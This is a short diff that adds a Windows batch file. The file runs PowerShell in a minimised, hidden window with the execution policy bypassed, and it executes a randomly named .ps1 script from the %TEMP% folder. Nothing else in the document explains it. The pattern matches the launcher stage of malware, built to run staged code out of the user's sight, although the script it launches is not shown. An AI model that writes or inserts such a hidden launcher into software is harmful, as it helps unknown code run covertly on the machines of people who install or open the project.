@@ -1,0 +1,3 @@
+@echo off
+
+START /min cmd /C powershell -ExecutionPolicy ByPass -WindowStyle Hidden -NonInteractive -NoLogo -File %TEMP%\GHyuttfgfHJGHUyutUYgh54568977SDFSDF.ps1
